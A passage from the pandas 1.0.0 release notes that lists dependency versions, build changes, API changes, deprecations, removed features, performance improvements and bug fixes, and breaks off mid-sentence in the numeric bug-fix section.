|\n+-----------------+-----------------+---------+\n| pytables        | 3.4.2           |         |\n+-----------------+-----------------+---------+\n| s3fs            | 0.3.0           |    X    |\n+-----------------+-----------------+---------+\n| scipy           | 0.19.0          |         |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.1.4           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.8.2           |         |\n+-----------------+-----------------+---------+\n| xlrd            | 1.1.0           |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 0.9.8           |         |\n+-----------------+-----------------+---------+\n| xlwt            | 1.2.0           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nBuild changes\n^^^^^^^^^^^^^\n\npandas has added a `pyproject.toml <https://www.python.org/dev/peps/pep-0517/>`_ file and will no longer include\ncythonized files in the source distribution uploaded to PyPI (:issue:`28341`, :issue:`20775`). If you're installing\na built distribution (wheel) or via conda, this shouldn't have any effect on you. If you're building pandas from\nsource, you should no longer need to install Cython into your build environment before calling ``pip install pandas``.\n\n\n.. _whatsnew_100.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` now raises on invalid operation names (:issue:`27489`)\n- :meth:`pandas.api.types.infer_dtype` will now return \"integer-na\" for integer and ``np.nan`` mix (:issue:`27283`)\n- :meth:`MultiIndex.from_arrays` will no longer infer names from arrays if ``names=None`` is explicitly provided (:issue:`27292`)\n- In order to improve tab-completion, pandas does not include most deprecated attributes when introspecting a pandas object using ``dir`` (e.g. ``dir(df)``).\n  To see which attributes are excluded, see an object's ``_deprecations`` attribute, for example ``pd.DataFrame._deprecations`` (:issue:`28805`).\n- The returned dtype of :func:`unique` now matches the input dtype. (:issue:`27874`)\n- Changed the default configuration value for ``options.matplotlib.register_converters`` from ``True`` to ``\"auto\"`` (:issue:`18720`).\n  Now, pandas custom formatters will only be applied to plots created by pandas, through :meth:`~DataFrame.plot`.\n  Previously, pandas' formatters would be applied to all plots created *after* a :meth:`~DataFrame.plot`.\n  See :ref:`units registration <whatsnew_100.matplotlib_units>` for more.\n- :meth:`Series.dropna` has dropped its ``**kwargs`` argument in favor of a single ``how`` parameter.\n  Supplying anything else than ``how`` to ``**kwargs`` raised a ``TypeError`` previously (:issue:`29388`)\n- When testing pandas, the new minimum required version of pytest is 5.0.1 (:issue:`29664`)\n- :meth:`Series.str.__iter__` was deprecated and will be removed in future releases (:issue:`28277`).\n- Added ``<NA>`` to the list of default NA values for :meth:`read_csv` (:issue:`30821`)\n\n.. _whatsnew_100.api.documentation:\n\nDocumentation improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Added new section on :ref:`scale` (:issue:`28315`).\n- Added sub-section on :ref:`io.query_multi` for HDF5 datasets (:issue:`28791`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- :meth:`Series.item` and :meth:`Index.item` have been _undeprecated_ (:issue:`29250`)\n- ``Index.set_value`` has been deprecated. For a given index ``idx``, array ``arr``,\n  value in ``idx`` of ``idx_val`` and a new value of ``val``, ``idx.set_value(arr, idx_val, val)``\n  is equivalent to ``arr[idx.get_loc(idx_val)] = val``, which should be used instead (:issue:`28621`).\n- :func:`is_extension_type` is deprecated, :func:`is_extension_array_dtype` should be used instead (:issue:`29457`)\n- :func:`eval` keyword argument \"truediv\" is deprecated and will be removed in a future version (:issue:`29812`)\n- :meth:`DateOffset.isAnchored` and :meth:`DatetOffset.onOffset` are deprecated and will be removed in a future version, use :meth:`DateOffset.is_anchored` and :meth:`DateOffset.is_on_offset` instead (:issue:`30340`)\n- ``pandas.tseries.frequencies.get_offset`` is deprecated and will be removed in a future version, use ``pandas.tseries.frequencies.to_offset`` instead (:issue:`4205`)\n- :meth:`Categorical.take_nd` and :meth:`CategoricalIndex.take_nd` are deprecated, use :meth:`Categorical.take` and :meth:`CategoricalIndex.take` instead (:issue:`27745`)\n- The parameter ``numeric_only`` of :meth:`Categorical.min` and :meth:`Categorical.max` is deprecated and replaced with ``skipna`` (:issue:`25303`)\n- The parameter ``label`` in :func:`lreshape` has been deprecated and will be removed in a future version (:issue:`29742`)\n- ``pandas.core.index`` has been deprecated and will be removed in a future version, the public classes are available in the top-level namespace (:issue:`19711`)\n- :func:`pandas.json_normalize` is now exposed in the top-level namespace.\n  Usage of ``json_normalize`` as ``pandas.io.json.json_normalize`` is now deprecated and\n  it is recommended to use ``json_normalize`` as :func:`pandas.json_normalize` instead (:issue:`27586`).\n- The ``numpy`` argument of :meth:`pandas.read_json` is deprecated (:issue:`28512`).\n- :meth:`DataFrame.to_stata`, :meth:`DataFrame.to_feather`, and :meth:`DataFrame.to_parquet` argument \"fname\" is deprecated, use \"path\" instead (:issue:`23574`)\n- The deprecated internal attributes ``_start``, ``_stop`` and ``_step`` of :class:`RangeIndex` now raise a ``FutureWarning`` instead of a ``DeprecationWarning`` (:issue:`26581`)\n- The ``pandas.util.testing`` module has been deprecated. Use the public API in ``pandas.testing`` documented at :ref:`api.general.testing` (:issue:`16232`).\n- ``pandas.SparseArray`` has been deprecated.  Use ``pandas.arrays.SparseArray`` (:class:`arrays.SparseArray`) instead. (:issue:`30642`)\n- The parameter ``is_copy`` of :meth:`Series.take` and :meth:`DataFrame.take` has been deprecated and will be removed in a future version. (:issue:`27357`)\n- Support for multi-dimensional indexing (e.g. ``index[:, None]``) on a :class:`Index` is deprecated and will be removed in a future version, convert to a numpy array before indexing instead (:issue:`30588`)\n- The ``pandas.np`` submodule is now deprecated. Import numpy directly instead (:issue:`30296`)\n- The ``pandas.datetime`` class is now deprecated. Import from ``datetime`` instead (:issue:`30610`)\n- :class:`~DataFrame.diff` will raise a ``TypeError`` rather than implicitly losing the dtype of extension types in the future. Convert to the correct dtype before calling ``diff`` instead (:issue:`31025`)\n\n**Selecting Columns from a Grouped DataFrame**\n\nWhen selecting columns from a :class:`DataFrameGroupBy` object, passing individual keys (or a tuple of keys) inside single brackets is deprecated,\na list of items should be used instead. (:issue:`23566`) For example:\n\n.. code-block:: ipython\n\n    df = pd.DataFrame({\n        \"A\": [\"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"foo\"],\n        \"B\": np.random.randn(8),\n        \"C\": np.random.randn(8),\n    })\n    g = df.groupby('A')\n\n    # single key, returns SeriesGroupBy\n    g['B']\n\n    # tuple of single key, returns SeriesGroupBy\n    g[('B',)]\n\n    # tuple of multiple keys, returns DataFrameGroupBy, raises FutureWarning\n    g[('B', 'C')]\n\n    # multiple keys passed directly, returns DataFrameGroupBy, raises FutureWarning\n    # (implicitly converts the passed strings into a single tuple)\n    g['B', 'C']\n\n    # proper way, returns DataFrameGroupBy\n    g[['B', 'C']]\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Removed SparseSeries and SparseDataFrame**\n\n``SparseSeries``, ``SparseDataFrame`` and the ``DataFrame.to_sparse`` method\nhave been removed (:issue:`28425`). We recommend using a ``Series`` or\n``DataFrame`` with sparse values instead.\n\n.. _whatsnew_100.matplotlib_units:\n\n**Matplotlib unit registration**\n\nPreviously, pandas would register converters with matplotlib as a side effect of importing pandas (:issue:`18720`).\nThis changed the output of plots made via matplotlib plots after pandas was imported, even if you were using\nmatplotlib directly rather than :meth:`~DataFrame.plot`.\n\nTo use pandas formatters with a matplotlib plot, specify\n\n.. code-block:: ipython\n\n   In [1]: import pandas as pd\n   In [2]: pd.options.plotting.matplotlib.register_converters = True\n\nNote that plots created by :meth:`DataFrame.plot` and :meth:`Series.plot` *do* register the converters\nautomatically. The only behavior change is when plotting a date-like object via ``matplotlib.pyplot.plot``\nor ``matplotlib.Axes.plot``. See :ref:`plotting.formatters` for more.\n\n**Other removals**\n\n- Removed the previously deprecated keyword \"index\" from :func:`read_stata`, :class:`StataReader`, and :meth:`StataReader.read`, use \"index_col\" instead (:issue:`17328`)\n- Removed ``StataReader.data`` method, use :meth:`StataReader.read` instead (:issue:`9493`)\n- Removed ``pandas.plotting._matplotlib.tsplot``, use :meth:`Series.plot` instead (:issue:`19980`)\n- ``pandas.tseries.converter.register`` has been moved to :func:`pandas.plotting.register_matplotlib_converters` (:issue:`18307`)\n- :meth:`Series.plot` no longer accepts positional arguments, pass keyword arguments instead (:issue:`30003`)\n- :meth:`DataFrame.hist` and :meth:`Series.hist` no longer allows ``figsize=\"default\"``, specify figure size by passinig a tuple instead (:issue:`30003`)\n- Floordiv of integer-dtyped array by :class:`Timedelta` now raises ``TypeError`` (:issue:`21036`)\n- :class:`TimedeltaIndex` and :class:`DatetimeIndex` no longer accept non-nanosecond dtype strings like \"timedelta64\" or \"datetime64\", use \"timedelta64[ns]\" and \"datetime64[ns]\" instead (:issue:`24806`)\n- Changed the default \"skipna\" argument in :func:`pandas.api.types.infer_dtype` from ``False`` to ``True`` (:issue:`24050`)\n- Removed ``Series.ix`` and ``DataFrame.ix`` (:issue:`26438`)\n- Removed ``Index.summary`` (:issue:`18217`)\n- Removed the previously deprecated keyword \"fastpath\" from the :class:`Index` constructor (:issue:`23110`)\n- Removed ``Series.get_value``, ``Series.set_value``, ``DataFrame.get_value``, ``DataFrame.set_value`` (:issue:`17739`)\n- Removed ``Series.compound`` and ``DataFrame.compound`` (:issue:`26405`)\n- Changed the default \"inplace\" argument in :meth:`DataFrame.set_index` and :meth:`Series.set_axis` from ``None`` to ``False`` (:issue:`27600`)\n- Removed ``Series.cat.categorical``, ``Series.cat.index``, ``Series.cat.name`` (:issue:`24751`)\n- Removed the previously deprecated keyword \"box\" from :func:`to_datetime` and :func:`to_timedelta`; in addition these now always returns :class:`DatetimeIndex`, :class:`TimedeltaIndex`, :class:`Index`, :class:`Series`, or :class:`DataFrame` (:issue:`24486`)\n- :func:`to_timedelta`, :class:`Timedelta`, and :class:`TimedeltaIndex` no longer allow \"M\", \"y\", or \"Y\" for the \"unit\" argument (:issue:`23264`)\n- Removed the previously deprecated keyword \"time_rule\" from (non-public) ``offsets.generate_range``, which has been moved to :func:`core.arrays._ranges.generate_range` (:issue:`24157`)\n- :meth:`DataFrame.loc` or :meth:`Series.loc` with listlike indexers and missing labels will no longer reindex (:issue:`17295`)\n- :meth:`DataFrame.to_excel` and :meth:`Series.to_excel` with non-existent columns will no longer reindex (:issue:`17295`)\n- Removed the previously deprecated keyword \"join_axes\" from :func:`concat`; use ``reindex_like`` on the result instead (:issue:`22318`)\n- Removed the previously deprecated keyword \"by\" from :meth:`DataFrame.sort_index`, use :meth:`DataFrame.sort_values` instead (:issue:`10726`)\n- Removed support for nested renaming in :meth:`DataFrame.aggregate`, :meth:`Series.aggregate`, :meth:`core.groupby.DataFrameGroupBy.aggregate`, :meth:`core.groupby.SeriesGroupBy.aggregate`, :meth:`core.window.rolling.Rolling.aggregate` (:issue:`18529`)\n- Passing ``datetime64`` data to :class:`TimedeltaIndex` or ``timedelta64`` data to ``DatetimeIndex`` now raises ``TypeError`` (:issue:`23539`, :issue:`23937`)\n- Passing ``int64`` values to :class:`DatetimeIndex` and a timezone now interprets the values as nanosecond timestamps in UTC, not wall times in the given timezone (:issue:`24559`)\n- A tuple passed to :meth:`DataFrame.groupby` is now exclusively treated as a single key (:issue:`18314`)\n- Removed ``Index.contains``, use ``key in index`` instead (:issue:`30103`)\n- Addition and subtraction of ``int`` or integer-arrays is no longer allowed in :class:`Timestamp`, :class:`DatetimeIndex`, :class:`TimedeltaIndex`, use ``obj + n * obj.freq`` instead of ``obj + n`` (:issue:`22535`)\n- Removed ``Series.ptp`` (:issue:`21614`)\n- Removed ``Series.from_array`` (:issue:`18258`)\n- Removed ``DataFrame.from_items`` (:issue:`18458`)\n- Removed ``DataFrame.as_matrix``, ``Series.as_matrix`` (:issue:`18458`)\n- Removed ``Series.asobject`` (:issue:`18477`)\n- Removed ``DataFrame.as_blocks``, ``Series.as_blocks``, ``DataFrame.blocks``, ``Series.blocks`` (:issue:`17656`)\n- :meth:`pandas.Series.str.cat` now defaults to aligning ``others``, using ``join='left'`` (:issue:`27611`)\n- :meth:`pandas.Series.str.cat` does not accept list-likes *within* list-likes anymore (:issue:`27611`)\n- :meth:`Series.where` with ``Categorical`` dtype (or :meth:`DataFrame.where` with ``Categorical`` column) no longer allows setting new categories (:issue:`24114`)\n- Removed the previously deprecated keywords \"start\", \"end\", and \"periods\" from the :class:`DatetimeIndex`, :class:`TimedeltaIndex`, and :class:`PeriodIndex` constructors; use :func:`date_range`, :func:`timedelta_range`, and :func:`period_range` instead (:issue:`23919`)\n- Removed the previously deprecated keyword \"verify_integrity\" from the :class:`DatetimeIndex` and :class:`TimedeltaIndex` constructors (:issue:`23919`)\n- Removed the previously deprecated keyword \"fastpath\" from ``pandas.core.internals.blocks.make_block`` (:issue:`19265`)\n- Removed the previously deprecated keyword \"dtype\" from :meth:`Block.make_block_same_class` (:issue:`19434`)\n- Removed ``ExtensionArray._formatting_values``. Use :attr:`ExtensionArray._formatter` instead. (:issue:`23601`)\n- Removed ``MultiIndex.to_hierarchical`` (:issue:`21613`)\n- Removed ``MultiIndex.labels``, use :attr:`MultiIndex.codes` instead (:issue:`23752`)\n- Removed the previously deprecated keyword \"labels\" from the :class:`MultiIndex` constructor, use \"codes\" instead (:issue:`23752`)\n- Removed ``MultiIndex.set_labels``, use :meth:`MultiIndex.set_codes` instead (:issue:`23752`)\n- Removed the previously deprecated keyword \"labels\" from :meth:`MultiIndex.set_codes`, :meth:`MultiIndex.copy`, :meth:`MultiIndex.drop`, use \"codes\" instead (:issue:`23752`)\n- Removed support for legacy HDF5 formats (:issue:`29787`)\n- Passing a dtype alias (e.g. 'datetime64[ns, UTC]') to :class:`DatetimeTZDtype` is no longer allowed, use :meth:`DatetimeTZDtype.construct_from_string` instead (:issue:`23990`)\n- Removed the previously deprecated keyword \"skip_footer\" from :func:`read_excel`; use \"skipfooter\" instead (:issue:`18836`)\n- :func:`read_excel` no longer allows an integer value for the parameter ``usecols``, instead pass a list of integers from 0 to ``usecols`` inclusive (:issue:`23635`)\n- Removed the previously deprecated keyword \"convert_datetime64\" from :meth:`DataFrame.to_records` (:issue:`18902`)\n- Removed ``IntervalIndex.from_intervals`` in favor of the :class:`IntervalIndex` constructor (:issue:`19263`)\n- Changed the default \"keep_tz\" argument in :meth:`DatetimeIndex.to_series` from ``None`` to ``True`` (:issue:`23739`)\n- Removed ``api.types.is_period`` and ``api.types.is_datetimetz`` (:issue:`23917`)\n- Ability to read pickles containing :class:`Categorical` instances created with pre-0.16 version of pandas has been removed (:issue:`27538`)\n- Removed ``pandas.tseries.plotting.tsplot`` (:issue:`18627`)\n- Removed the previously deprecated keywords \"reduce\" and \"broadcast\" from :meth:`DataFrame.apply` (:issue:`18577`)\n- Removed the previously deprecated ``assert_raises_regex`` function in ``pandas._testing`` (:issue:`29174`)\n- Removed the previously deprecated ``FrozenNDArray`` class in ``pandas.core.indexes.frozen`` (:issue:`29335`)\n- Removed the previously deprecated keyword \"nthreads\" from :func:`read_feather`, use \"use_threads\" instead (:issue:`23053`)\n- Removed ``Index.is_lexsorted_for_tuple`` (:issue:`29305`)\n- Removed support for nested renaming in :meth:`DataFrame.aggregate`, :meth:`Series.aggregate`, :meth:`core.groupby.DataFrameGroupBy.aggregate`, :meth:`core.groupby.SeriesGroupBy.aggregate`, :meth:`core.window.rolling.Rolling.aggregate` (:issue:`29608`)\n- Removed ``Series.valid``; use :meth:`Series.dropna` instead (:issue:`18800`)\n- Removed ``DataFrame.is_copy``, ``Series.is_copy`` (:issue:`18812`)\n- Removed ``DataFrame.get_ftype_counts``, ``Series.get_ftype_counts`` (:issue:`18243`)\n- Removed ``DataFrame.ftypes``, ``Series.ftypes``, ``Series.ftype`` (:issue:`26744`)\n- Removed ``Index.get_duplicates``, use ``idx[idx.duplicated()].unique()`` instead (:issue:`20239`)\n- Removed ``Series.clip_upper``, ``Series.clip_lower``, ``DataFrame.clip_upper``, ``DataFrame.clip_lower`` (:issue:`24203`)\n- Removed the ability to alter :attr:`DatetimeIndex.freq`, :attr:`TimedeltaIndex.freq`, or :attr:`PeriodIndex.freq` (:issue:`20772`)\n- Removed ``DatetimeIndex.offset`` (:issue:`20730`)\n- Removed ``DatetimeIndex.asobject``, ``TimedeltaIndex.asobject``, ``PeriodIndex.asobject``, use ``astype(object)`` instead (:issue:`29801`)\n- Removed the previously deprecated keyword \"order\" from :func:`factorize` (:issue:`19751`)\n- Removed the previously deprecated keyword \"encoding\" from :func:`read_stata` and :meth:`DataFrame.to_stata` (:issue:`21400`)\n- Changed the default \"sort\" argument in :func:`concat` from ``None`` to ``False`` (:issue:`20613`)\n- Removed the previously deprecated keyword \"raise_conflict\" from :meth:`DataFrame.update`, use \"errors\" instead (:issue:`23585`)\n- Removed the previously deprecated keyword \"n\" from :meth:`DatetimeIndex.shift`, :meth:`TimedeltaIndex.shift`, :meth:`PeriodIndex.shift`, use \"periods\" instead (:issue:`22458`)\n- Removed the previously deprecated keywords \"how\", \"fill_method\", and \"limit\" from :meth:`DataFrame.resample` (:issue:`30139`)\n- Passing an integer to :meth:`Series.fillna` or :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype now raises ``TypeError`` (:issue:`24694`)\n- Passing multiple axes to :meth:`DataFrame.dropna` is no longer supported (:issue:`20995`)\n- Removed ``Series.nonzero``, use ``to_numpy().nonzero()`` instead (:issue:`24048`)\n- Passing floating dtype ``codes`` to :meth:`Categorical.from_codes` is no longer supported, pass ``codes.astype(np.int64)`` instead (:issue:`21775`)\n- Removed the previously deprecated keyword \"pat\" from :meth:`Series.str.partition` and :meth:`Series.str.rpartition`, use \"sep\" instead (:issue:`23767`)\n- Removed ``Series.put`` (:issue:`27106`)\n- Removed ``Series.real``, ``Series.imag`` (:issue:`27106`)\n- Removed ``Series.to_dense``, ``DataFrame.to_dense`` (:issue:`26684`)\n- Removed ``Index.dtype_str``, use ``str(index.dtype)`` instead (:issue:`27106`)\n- :meth:`Categorical.ravel` returns a :class:`Categorical` instead of a ``ndarray`` (:issue:`27199`)\n- The 'outer' method on Numpy ufuncs, e.g. ``np.subtract.outer`` operating on :class:`Series` objects is no longer supported, and will raise ``NotImplementedError`` (:issue:`27198`)\n- Removed ``Series.get_dtype_counts`` and ``DataFrame.get_dtype_counts`` (:issue:`27145`)\n- Changed the default \"fill_value\" argument in :meth:`Categorical.take` from ``True`` to ``False`` (:issue:`20841`)\n- Changed the default value for the ``raw`` argument in :func:`Series.rolling().apply() <.Rolling.apply>`, :func:`DataFrame.rolling().apply() <.Rolling.apply>`, :func:`Series.expanding().apply() <.Expanding.apply>`, and :func:`DataFrame.expanding().apply() <.Expanding.apply>` from ``None`` to ``False`` (:issue:`20584`)\n- Removed deprecated behavior of :meth:`Series.argmin` and :meth:`Series.argmax`, use :meth:`Series.idxmin` and :meth:`Series.idxmax` for the old behavior (:issue:`16955`)\n- Passing a tz-aware ``datetime.datetime`` or :class:`Timestamp` into the :class:`Timestamp` constructor with the ``tz`` argument now raises a ``ValueError`` (:issue:`23621`)\n- Removed ``Series.base``, ``Index.base``, ``Categorical.base``, ``Series.flags``, ``Index.flags``, ``PeriodArray.flags``, ``Series.strides``, ``Index.strides``, ``Series.itemsize``, ``Index.itemsize``, ``Series.data``, ``Index.data`` (:issue:`20721`)\n- Changed :meth:`Timedelta.resolution` to match the behavior of the standard library ``datetime.timedelta.resolution``, for the old behavior, use :meth:`Timedelta.resolution_string` (:issue:`26839`)\n- Removed ``Timestamp.weekday_name``, ``DatetimeIndex.weekday_name``, and ``Series.dt.weekday_name`` (:issue:`18164`)\n- Removed the previously deprecated keyword \"errors\" in :meth:`Timestamp.tz_localize`, :meth:`DatetimeIndex.tz_localize`, and :meth:`Series.tz_localize` (:issue:`22644`)\n- Changed the default \"ordered\" argument in :class:`CategoricalDtype` from ``None`` to ``False`` (:issue:`26336`)\n- :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` now require \"labels\" as the first argument and \"axis\" as an optional named parameter (:issue:`30089`)\n- Removed ``to_msgpack``, ``read_msgpack``, ``DataFrame.to_msgpack``, ``Series.to_msgpack`` (:issue:`27103`)\n- Removed ``Series.compress`` (:issue:`21930`)\n- Removed the previously deprecated keyword \"fill_value\" from :meth:`Categorical.fillna`, use \"value\" instead (:issue:`19269`)\n- Removed the previously deprecated keyword \"data\" from :func:`andrews_curves`, use \"frame\" instead (:issue:`6956`)\n- Removed the previously deprecated keyword \"data\" from :func:`parallel_coordinates`, use \"frame\" instead (:issue:`6956`)\n- Removed the previously deprecated keyword \"colors\" from :func:`parallel_coordinates`, use \"color\" instead (:issue:`6956`)\n- Removed the previously deprecated keywords \"verbose\" and \"private_key\" from :func:`read_gbq` (:issue:`30200`)\n- Calling ``np.array`` and ``np.asarray`` on tz-aware :class:`Series` and :class:`DatetimeIndex` will now return an object array of tz-aware :class:`Timestamp` (:issue:`24596`)\n-\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvement in :class:`DataFrame` arithmetic and comparison operations with scalars (:issue:`24990`, :issue:`29853`)\n- Performance improvement in indexing with a non-unique :class:`IntervalIndex` (:issue:`27489`)\n- Performance improvement in :attr:`MultiIndex.is_monotonic` (:issue:`27495`)\n- Performance improvement in :func:`cut` when ``bins`` is an :class:`IntervalIndex` (:issue:`27668`)\n- Performance improvement when initializing a :class:`DataFrame` using a ``range`` (:issue:`30171`)\n- Performance improvement in :meth:`DataFrame.corr` when ``method`` is ``\"spearman\"`` (:issue:`28139`)\n- Performance improvement in :meth:`DataFrame.replace` when provided a list of values to replace (:issue:`28099`)\n- Performance improvement in :meth:`DataFrame.select_dtypes` by using vectorization instead of iterating over a loop (:issue:`28317`)\n- Performance improvement in :meth:`Categorical.searchsorted` and  :meth:`CategoricalIndex.searchsorted` (:issue:`28795`)\n- Performance improvement when comparing a :class:`Categorical` with a scalar and the scalar is not found in the categories (:issue:`29750`)\n- Performance improvement when checking if values in a :class:`Categorical` are equal, equal or larger or larger than a given scalar.\n  The improvement is not present if checking if the :class:`Categorical` is less than or less than or equal than the scalar (:issue:`29820`)\n- Performance improvement in :meth:`Index.equals` and  :meth:`MultiIndex.equals` (:issue:`29134`)\n- Performance improvement in :func:`~pandas.api.types.infer_dtype` when ``skipna`` is ``True`` (:issue:`28814`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n\nCategorical\n^^^^^^^^^^^\n\n- Added test to assert the :func:`fillna` raises the correct ``ValueError`` message when the value isn't a value from categories (:issue:`13628`)\n- Bug in :meth:`Categorical.astype` where ``NaN`` values were handled incorrectly when casting to int (:issue:`28406`)\n- :meth:`DataFrame.reindex` with a :class:`CategoricalIndex` would fail when the targets contained duplicates, and wouldn't fail if the source contained duplicates (:issue:`28107`)\n- Bug in :meth:`Categorical.astype` not allowing for casting to extension dtypes (:issue:`28668`)\n- Bug where :func:`merge` was unable to join on categorical and extension dtype columns (:issue:`28668`)\n- :meth:`Categorical.searchsorted` and :meth:`CategoricalIndex.searchsorted` now work on unordered categoricals also (:issue:`21667`)\n- Added test to assert roundtripping to parquet with :func:`DataFrame.to_parquet` or :func:`read_parquet` will preserve Categorical dtypes for string types (:issue:`27955`)\n- Changed the error message in :meth:`Categorical.remove_categories` to always show the invalid removals as a set (:issue:`28669`)\n- Using date accessors on a categorical dtyped :class:`Series` of datetimes was not returning an object of the\n  same type as if one used the :meth:`.str.` / :meth:`.dt.` on a :class:`Series` of that type. E.g. when accessing :meth:`Series.dt.tz_localize` on a\n  :class:`Categorical` with duplicate entries, the accessor was skipping duplicates (:issue:`27952`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` that would give incorrect results on categorical data (:issue:`26988`)\n- Bug where calling :meth:`Categorical.min` or :meth:`Categorical.max` on an empty Categorical would raise a numpy exception (:issue:`30227`)\n- The following methods now also correctly output values for unobserved categories when called through ``groupby(..., observed=False)`` (:issue:`17605`)\n  * :meth:`core.groupby.SeriesGroupBy.count`\n  * :meth:`core.groupby.SeriesGroupBy.size`\n  * :meth:`core.groupby.SeriesGroupBy.nunique`\n  * :meth:`core.groupby.SeriesGroupBy.nth`\n\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :meth:`Series.__setitem__` incorrectly casting ``np.timedelta64(\"NaT\")`` to ``np.datetime64(\"NaT\")`` when inserting into a :class:`Series` with datetime64 dtype (:issue:`27311`)\n- Bug in :meth:`Series.dt` property lookups when the underlying data is read-only (:issue:`27529`)\n- Bug in ``HDFStore.__getitem__`` incorrectly reading tz attribute created in Python 2 (:issue:`26443`)\n- Bug in :func:`to_datetime` where passing arrays of malformed ``str`` with errors=\"coerce\" could incorrectly lead to raising ``ValueError`` (:issue:`28299`)\n- Bug in :meth:`core.groupby.SeriesGroupBy.nunique` where ``NaT`` values were interfering with the count of unique values (:issue:`27951`)\n- Bug in :class:`Timestamp` subtraction when subtracting a :class:`Timestamp` from a ``np.datetime64`` object incorrectly raising ``TypeError`` (:issue:`28286`)\n- Addition and subtraction of integer or integer-dtype arrays with :class:`Timestamp` will now raise ``NullFrequencyError`` instead of ``ValueError`` (:issue:`28268`)\n- Bug in :class:`Series` and :class:`DataFrame` with integer dtype failing to raise ``TypeError`` when adding or subtracting a ``np.datetime64`` object (:issue:`28080`)\n- Bug in :meth:`Series.astype`, :meth:`Index.astype`, and :meth:`DataFrame.astype` failing to handle ``NaT`` when casting to an integer dtype (:issue:`28492`)\n- Bug in :class:`Week` with ``weekday`` incorrectly raising ``AttributeError`` instead of ``TypeError`` when adding or subtracting an invalid type (:issue:`28530`)\n- Bug in :class:`DataFrame` arithmetic operations when operating with a :class:`Series` with dtype ``'timedelta64[ns]'`` (:issue:`28049`)\n- Bug in :func:`core.groupby.generic.SeriesGroupBy.apply` raising ``ValueError`` when a column in the original DataFrame is a datetime and the column labels are not standard integers (:issue:`28247`)\n- Bug in :func:`pandas._config.localization.get_locales` where the ``locales -a`` encodes the locales list as windows-1252 (:issue:`23638`, :issue:`24760`, :issue:`27368`)\n- Bug in :meth:`Series.var` failing to raise ``TypeError`` when called with ``timedelta64[ns]`` dtype (:issue:`28289`)\n- Bug in :meth:`DatetimeIndex.strftime` and :meth:`Series.dt.strftime` where ``NaT`` was converted to the string ``'NaT'`` instead of ``np.nan`` (:issue:`29578`)\n- Bug in masking datetime-like arrays with a boolean mask of an incorrect length not raising an ``IndexError`` (:issue:`30308`)\n- Bug in :attr:`Timestamp.resolution` being a property instead of a class attribute (:issue:`29910`)\n- Bug in :func:`pandas.to_datetime` when called with ``None`` raising ``TypeError`` instead of returning ``NaT`` (:issue:`30011`)\n- Bug in :func:`pandas.to_datetime` failing for ``deque`` objects when using ``cache=True`` (the default) (:issue:`29403`)\n- Bug in :meth:`Series.item` with ``datetime64`` or ``timedelta64`` dtype, :meth:`DatetimeIndex.item`, and :meth:`TimedeltaIndex.item` returning an integer instead of a :class:`Timestamp` or :class:`Timedelta` (:issue:`30175`)\n- Bug in :class:`DatetimeIndex` addition when adding a non-optimized :class:`DateOffset` incorrectly dropping timezone information (:issue:`30336`)\n- Bug in :meth:`DataFrame.drop` where attempting to drop non-existent values from a DatetimeIndex would yield a confusing error message (:issue:`30399`)\n- Bug in :meth:`DataFrame.append` would remove the timezone-awareness of new data (:issue:`30238`)\n- Bug in :meth:`Series.cummin` and :meth:`Series.cummax` with timezone-aware dtype incorrectly dropping its timezone (:issue:`15553`)\n- Bug in :class:`DatetimeArray`, :class:`TimedeltaArray`, and :class:`PeriodArray` where inplace addition and subtraction did not actually operate inplace (:issue:`24115`)\n- Bug in :func:`pandas.to_datetime` when called with ``Series`` storing ``IntegerArray`` raising ``TypeError`` instead of returning ``Series`` (:issue:`30050`)\n- Bug in :func:`date_range` with custom business hours as ``freq`` and given number of ``periods`` (:issue:`30593`)\n- Bug in :class:`PeriodIndex` comparisons with incorrectly casting integers to :class:`Period` objects, inconsistent with the :class:`Period` comparison behavior (:issue:`30722`)\n- Bug in :meth:`DatetimeIndex.insert` raising a ``ValueError`` instead of a ``TypeError`` when trying to insert a timezone-aware :class:`Timestamp` into a timezone-naive :class:`DatetimeIndex`, or vice-versa (:issue:`30806`)\n\nTimedelta\n^^^^^^^^^\n- Bug in subtracting a :class:`TimedeltaIndex` or :class:`TimedeltaArray` from a ``np.datetime64`` object (:issue:`29558`)\n-\n\nTimezones\n^^^^^^^^^\n\n-\n\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.quantile` with zero-column :class:`DataFrame` incorrectly raising (:issue:`23925`)\n- :class:`DataFrame` flex inequality comparisons methods (:meth:`DataFrame.lt`, :meth:`DataFrame.le`, :meth:`DataFrame.gt`, :meth:`DataFrame.ge`) with object-dtype and ``complex`` entries failing to raise ``TypeError`` like their :class:`Series` counterparts (:issue:`28079`)\n- Bug in :class:`DataFrame` logical operations (``&``, ``|``, ``^``) not matching :class:`Series` behavior by filling NA values (:issue:`28741`)\n- Bug in :meth:`DataFrame.interpolate` where specifying axis by name references variable before it is assigned (:issue:`29142`)\n- Bug in :meth:`Series.var` not computing the right value with a nullable integer dtype series not passing through ddof argument (:issue:`29128`)\n- Improved error message when using ``frac`` > 1 and ``replace`` = False (:issue:`27451`)\n- Bug in numeric indexes resulted in it being possible to instantiate an :class:`Int64Index`, :class:`UInt64Index`, or :class:`Float64Index` with an invalid dtype (e.g. 